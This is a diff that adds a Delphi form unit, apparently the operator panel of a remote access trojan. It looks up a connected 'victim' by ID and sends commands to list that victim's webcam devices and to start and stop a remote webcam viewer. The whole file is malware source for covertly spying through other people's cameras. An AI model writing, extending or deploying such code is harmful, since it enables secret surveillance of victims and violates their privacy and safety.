@@ -1,0 +1,77 @@
+unit FrmCam;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ExtCtrls;
+
+type
+  TForm17 = class(TForm)
+    Image1: TImage;
+    ComboBox1: TComboBox;
+    Button1: TButton;
+    Button2: TButton;
+    procedure Button1Click(Sender: TObject);
+    procedure FormShow(Sender: TObject);
+    procedure FormDestroy(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    ThisFormsVictimID: string;
+  end;
+
+var
+  Form17: TForm17;
+
+implementation
+
+{$R *.dfm}
+
+uses FrmMain;
+
+procedure SendToSelectedClient(const VictimID, Msg: string);
+var
+  I: Integer;
+  NickName: string;
+  UserData: TConnectedUserData;
+begin
+  NickName := VictimID;
+  for I := 0 to Form1.ConnectedUsers.Count - 1 do
+  begin
+    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
+    if UserData.ID = NickName then
+    begin
+      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
+      Exit;
+    end;
+  end;
+end;
+
+procedure TForm17.Button1Click(Sender: TObject);
+begin
+  if self.Button1.Caption <> 'Stop' then
+  begin
+    SendToSelectedClient(self.ThisFormsVictimID,
+      'WebcamViewer|' + ComboBox1.Text);
+    Button1.Caption := 'Stop';
+  end
+  else
+  begin
+    self.Button1.Caption := 'Start';
+    SendToSelectedClient(self.ThisFormsVictimID, 'StopWebcamViewer|');
+  end;
+end;
+
+procedure TForm17.FormDestroy(Sender: TObject);
+begin
+  Image1.Picture := nil;
+end;
+
+procedure TForm17.FormShow(Sender: TObject);
+begin
+  SendToSelectedClient(ThisFormsVictimID, 'WebcamDeviceList|');
+end;
+
+end.
